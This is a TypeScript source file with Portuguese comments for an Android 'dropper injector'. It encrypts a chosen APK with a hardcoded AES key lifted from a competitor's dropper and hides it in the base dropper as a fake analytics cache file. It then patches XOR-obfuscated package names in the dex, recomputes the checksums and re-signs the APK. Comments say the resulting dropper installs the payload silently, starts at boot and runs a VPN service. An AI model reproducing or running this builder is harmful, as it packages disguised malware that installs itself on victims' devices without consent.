/**
 * Dropper Injector — Modo de injeção real (replica o concorrente)
 *
 * Fluxo:
 * 1. Lê o APK do usuário
 * 2. Criptografa com AES-256-CBC (chave/IV fixos extraídos do dropper)
 * 3. Abre o dropper base (ChatStore2.apk) como ZIP
 * 4. Substitui assets/analytics_events.cache pelo APK criptografado
 * 5. Faz patch no classes.dex para atualizar o package name do APK alvo
 * 6. Assina com uber-apk-signer
 * 7. Retorna o APK dropper modificado
 *
 * O dropper base (com.tendo.data) contém:
 * - VPN service (BIND_VPN_SERVICE)
 * - BootReceiver (inicia na inicialização)
 * - PackageInstaller (instala o APK alvo silenciosamente)
 * - Descriptografador AES-256-CBC para ler o APK alvo
 */

import { createCipheriv } from "crypto";
import AdmZip from "adm-zip";
import { execFile } from "child_process";
import { promisify } from "util";
import { mkdtemp, rm, readFile, writeFile } from "fs/promises";
import { tmpdir } from "os";
import { join, dirname } from "path";
import { fileURLToPath } from "url";
import { existsSync, readdirSync } from "fs";
import { createAdler32, createSha1 } from "./cryptoUtils.js";

const execFileAsync = promisify(execFile);

const __dirname = dirname(fileURLToPath(import.meta.url));
const TOOLS_DIR = join(__dirname, "tools");
const SIGNER_JAR = join(TOOLS_DIR, "uber-apk-signer.jar");
const DROPPER_BASE = join(__dirname, "dropper", "dropper-base.apk");

// ─── Constantes de criptografia (extraídas do smali do dropper) ──────────────

/** Chave AES-256 (32 bytes) — ud.v XOR 0xED */
const AES_KEY = Buffer.from(
  "0d915a16e6138936809584e26355e9c4f347e75a0c5a039f096c817063e0acbe",
  "hex",
);

/** IV AES-CBC (16 bytes) — ud.w XOR 0xED */
const AES_IV = Buffer.from("4cb36d09bd93b2ad1a9324a19ebac0ae", "hex");

/** Nome do asset no dropper — ud.u XOR 0xED */
const ASSET_FILENAME = "assets/analytics_events.cache";

/** Package name original hardcoded no dex — ud.z XOR 0xED */
const ORIGINAL_PACKAGE = "queue.watchdogx.stabilizer";

// ─── Detectar Java ────────────────────────────────────────────────────────────

function getJavaPath(): string {
  const candidates = [
    process.env.JAVA_HOME ? join(process.env.JAVA_HOME, "bin", "java") : null,
    "/usr/bin/java",
    "/usr/local/bin/java",
    "/usr/lib/jvm/default-java/bin/java",
    "/usr/lib/jvm/java-21-openjdk-amd64/bin/java",
    "/usr/lib/jvm/java-17-openjdk-amd64/bin/java",
    "/usr/lib/jvm/java-11-openjdk-amd64/bin/java",
    "java",
  ];
  for (const c of candidates) {
    if (!c) continue;
    if (c === "java") return "java";
    if (existsSync(c)) return c;
  }
  return "java";
}

const JAVA_PATH = getJavaPath();

// ─── Tipos ────────────────────────────────────────────────────────────────────

export interface InjectorResult {
  apkBuffer: Buffer;
  log: string[];
  packageName: string;
}

// ─── Função principal ─────────────────────────────────────────────────────────

/**
 * Injeta o APK do usuário no dropper base (ChatStore2.apk).
 * O dropper resultante instala o APK alvo silenciosamente e ativa o serviço VPN.
 */
export async function injectDropper(inputBuffer: Buffer): Promise<InjectorResult> {
  const log: string[] = [];

  if (!existsSync(DROPPER_BASE)) {
    throw new Error(`Dropper base não encontrado em: ${DROPPER_BASE}`);
  }

  log.push(`📦 APK recebido (${(inputBuffer.length / 1024 / 1024).toFixed(2)} MB)`);
  log.push(`🔧 Java path: ${JAVA_PATH}`);

  // ── 1. Extrair package name do APK alvo ────────────────────────────────────

  log.push("🔍 Extraindo package name do APK alvo...");
  let targetPackage = "";
  try {
    targetPackage = extractPackageNameFromApk(inputBuffer);
    log.push(`  ✅ Package name: ${targetPackage}`);
  } catch (err) {
    log.push(`  ⚠️  Não foi possível extrair package name: ${(err as Error).message}`);
    log.push(`  ℹ️  Usando package name padrão do dropper`);
    targetPackage = ORIGINAL_PACKAGE;
  }

  // ── 2. Criptografar APK com AES-256-CBC ────────────────────────────────────

  log.push("🔐 Criptografando APK com AES-256-CBC...");
  const encryptedApk = encryptApk(inputBuffer);
  log.push(`  ✅ APK criptografado (${(encryptedApk.length / 1024 / 1024).toFixed(2)} MB)`);

  // ── 3. Abrir dropper base como ZIP ────────────────────────────────────────

  log.push("📂 Carregando dropper base (com.tendo.data)...");
  const dropperBuffer = await readFile(DROPPER_BASE);
  const zip = new AdmZip(dropperBuffer);
  log.push(`  ✅ Dropper base carregado (${(dropperBuffer.length / 1024 / 1024).toFixed(2)} MB)`);

  // ── 4. Substituir analytics_events.cache ──────────────────────────────────

  log.push(`📥 Substituindo ${ASSET_FILENAME}...`);
  const existingEntry = zip.getEntry(ASSET_FILENAME);
  if (!existingEntry) {
    throw new Error(`Asset ${ASSET_FILENAME} não encontrado no dropper base`);
  }
  zip.deleteFile(ASSET_FILENAME);
  zip.addFile(ASSET_FILENAME, encryptedApk);
  log.push(`  ✅ Asset substituído (${(encryptedApk.length / 1024 / 1024).toFixed(2)} MB)`);

  // ── 5. Patch no classes.dex para atualizar o package name ─────────────────

  if (targetPackage && targetPackage !== ORIGINAL_PACKAGE) {
    log.push(`🔧 Atualizando package name no dex: ${ORIGINAL_PACKAGE} → ${targetPackage}`);
    try {
      const dexEntry = zip.getEntry("classes.dex");
      if (dexEntry) {
        const dexData = dexEntry.getData();
        const patchedDex = patchDexPackageName(dexData, targetPackage);
        zip.deleteFile("classes.dex");
        zip.addFile("classes.dex", patchedDex);
        log.push(`  ✅ Package name atualizado no dex`);
      } else {
        log.push(`  ⚠️  classes.dex não encontrado no dropper`);
      }
    } catch (err) {
      log.push(`  ⚠️  Falha ao atualizar package name no dex: ${(err as Error).message}`);
      log.push(`  ℹ️  O dropper ainda funciona, mas não abrirá o app automaticamente`);
    }
  } else {
    log.push(`ℹ️  Package name igual ao original — sem patch no dex necessário`);
  }

  // ── 6. Recompactar o APK dropper ──────────────────────────────────────────

  log.push("🗜️  Recompactando APK dropper...");
  const repackedBuffer = zip.toBuffer();
  log.push(`  ✅ APK recompactado (${(repackedBuffer.length / 1024 / 1024).toFixed(2)} MB)`);

  // ── 7. Assinar com uber-apk-signer ────────────────────────────────────────

  log.push("🔐 Assinando APK dropper com uber-apk-signer...");
  const signedBuffer = await signApk(repackedBuffer, log);

  log.push(`✅ APK dropper gerado com sucesso!`);
  log.push(`  📦 Package: com.tendo.data (dropper)`);
  log.push(`  🎯 Target: ${targetPackage}`);
  log.push(`  📏 Tamanho final: ${(signedBuffer.length / 1024 / 1024).toFixed(2)} MB`);

  return { apkBuffer: signedBuffer, log, packageName: targetPackage };
}

// ─── Criptografia AES-256-CBC ─────────────────────────────────────────────────

/**
 * Criptografa o APK com AES-256-CBC + PKCS7 padding.
 * Replica exatamente o que o dropper espera ao descriptografar.
 */
export function encryptApk(apkBuffer: Buffer): Buffer {
  const cipher = createCipheriv("aes-256-cbc", AES_KEY, AES_IV);
  return Buffer.concat([cipher.update(apkBuffer), cipher.final()]);
}

// ─── Extração do package name do AXML binário ─────────────────────────────────

/**
 * Extrai o package name do AndroidManifest.xml binário (AXML) de um APK.
 * Usa heurística de prefixo mais frequente no string pool.
 */
export function extractPackageNameFromApk(apkBuffer: Buffer): string {
  const zip = new AdmZip(apkBuffer);
  const manifestEntry = zip.getEntry("AndroidManifest.xml");
  if (!manifestEntry) throw new Error("AndroidManifest.xml não encontrado no APK");

  const manifestData = manifestEntry.getData();

  // Verificar magic AXML
  if (manifestData.length < 8 || manifestData.readUInt32LE(0) !== 0x00080003) {
    throw new Error("AndroidManifest.xml não é um AXML binário válido");
  }

  // Ler o string pool
  const spFlags = manifestData.readUInt32LE(24);
  const spStringsStart = manifestData.readUInt32LE(28);
  const spStringCount = manifestData.readUInt32LE(16);
  const isUtf8 = (spFlags & 0x100) !== 0;

  const offsetsStart = 36;
  const stringsBase = 8 + spStringsStart;

  const strings: string[] = [];
  for (let i = 0; i < spStringCount; i++) {
    const offset = manifestData.readUInt32LE(offsetsStart + i * 4);
    const absOffset = stringsBase + offset;

    let s: string;
    if (isUtf8) {
      const byteCount = manifestData[absOffset + 1];
      s = manifestData.slice(absOffset + 2, absOffset + 2 + byteCount).toString("utf-8");
    } else {
      const length = manifestData.readUInt16LE(absOffset);
      s = manifestData.slice(absOffset + 2, absOffset + 2 + length * 2).toString("utf16le");
    }
    strings.push(s);
  }

  // Heurística: procurar strings que terminam com nomes de componentes Android
  // (Activity, Service, Receiver, Provider) e extrair o prefixo como package name
  const COMPONENT_SUFFIXES = ["Activity", "Service", "Receiver", "Provider"];
  const ANDROID_PREFIXES = ["android", "androidx", "com.android", "com.google", "org.apache"];

  const packageCounts = new Map<string, number>();

  for (const s of strings) {
    if (!s.includes(".") || s.includes(" ") || s.length <= 5) continue;
    const parts = s.split(".");
    if (parts.length < 3) continue;

    // Verificar se a string termina com um nome de componente Android
    // Ex: "AlertActivity" ends with "Activity", "BootReceiver" ends with "Receiver"
    const lastPart = parts[parts.length - 1];
    const isComponent = COMPONENT_SUFFIXES.some((suffix) => lastPart.endsWith(suffix));
    if (!isComponent) continue;

    // Extrair o package name (tudo exceto o último componente)
    // Tentar prefixos de 2 a len-1 partes
    for (let n = 2; n < parts.length; n++) {
      const prefix = parts.slice(0, n).join(".");
      // Filtrar prefixos do Android SDK
      if (ANDROID_PREFIXES.some((ap) => prefix.startsWith(ap))) continue;
      // Verificar que todas as partes são identificadores válidos
      if (!parts.slice(0, n).every((p) => p && /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(p))) continue;
      packageCounts.set(prefix, (packageCounts.get(prefix) ?? 0) + 1);
    }
  }

  if (packageCounts.size === 0) {
    throw new Error("Não foi possível determinar o package name do APK");
  }

  // Escolher o candidato com mais ocorrências
  // Em caso de empate, preferir o mais longo (mais específico)
  const sortedCandidates = Array.from(packageCounts.entries()).sort(([a, countA], [b, countB]) => {
    if (countB !== countA) return countB - countA;
    return b.length - a.length;
  });

  return sortedCandidates[0][0];
}

// ─── Patch no DEX ─────────────────────────────────────────────────────────────

/**
 * Substitui o package name original (XOR'd com 0xED) no classes.dex.
 * Mantém o tamanho do array fixo (26 bytes) com padding de 0xED (= '\0' após XOR).
 * Recalcula os checksums Adler32 e SHA-1 do dex.
 */
export function patchDexPackageName(dexBuffer: Buffer, newPackage: string): Buffer {
  const ORIGINAL_LEN = ORIGINAL_PACKAGE.length; // 26 bytes

  // XOR o package original com 0xED para encontrar no dex
  const originalXored = Buffer.from(
    Array.from(ORIGINAL_PACKAGE).map((c) => c.charCodeAt(0) ^ 0xed),
  );

  const pos = dexBuffer.indexOf(originalXored);
  if (pos === -1) {
    throw new Error("Package name original não encontrado no dex");
  }

  const patched = Buffer.from(dexBuffer);

  // Criar novo array XOR'd com padding para 26 bytes
  const newPkgBytes = Buffer.from(newPackage, "utf-8");
  const newXored = Buffer.alloc(ORIGINAL_LEN, 0xed); // padding com 0xED (= '\0' após XOR)
  for (let i = 0; i < Math.min(newPkgBytes.length, ORIGINAL_LEN); i++) {
    newXored[i] = newPkgBytes[i] ^ 0xed;
  }

  // Substituir no dex (mesmo tamanho, sem mudar offsets)
  newXored.copy(patched, pos);

  // Recalcular SHA-1 (cobre bytes 32 até o final)
  const sha1 = createSha1(patched.slice(32));
  sha1.copy(patched, 12);

  // Recalcular Adler32 (cobre bytes 12 até o final)
  // Usar >>> 0 para garantir valor uint32 (sem overflow de int32)
  const adler = createAdler32(patched.slice(12)) >>> 0;
  patched.writeUInt32LE(adler, 8);

  return patched;
}

// ─── Assinatura com uber-apk-signer ──────────────────────────────────────────

async function signApk(apkBuffer: Buffer, log: string[]): Promise<Buffer> {
  const workDir = await mkdtemp(join(tmpdir(), "dropper-sign-"));

  try {
    const inputApk = join(workDir, "dropper.apk");
    const signedDir = join(workDir, "signed");

    await writeFile(inputApk, apkBuffer);

    await execFileAsync(
      JAVA_PATH,
      ["-jar", SIGNER_JAR, "--apks", inputApk, "--out", signedDir, "--allowResign"],
      { timeout: 90_000 },
    );

    const signedFiles = readdirSync(signedDir).filter((f) => f.endsWith(".apk"));
    if (signedFiles.length === 0) {
      throw new Error("Nenhum APK assinado encontrado");
    }

    const signedBuffer = await readFile(join(signedDir, signedFiles[0]));
    log.push(`  ✅ APK assinado com sucesso (${(signedBuffer.length / 1024 / 1024).toFixed(2)} MB)`);
    return signedBuffer;
  } catch (err) {
    const msg = (err as Error).message;
    log.push(`  ⚠️  Assinatura falhou: ${msg}`);
    throw new Error(`Falha ao assinar APK dropper: ${msg}`);
  } finally {
    await rm(workDir, { recursive: true, force: true }).catch(() => {});
  }
}
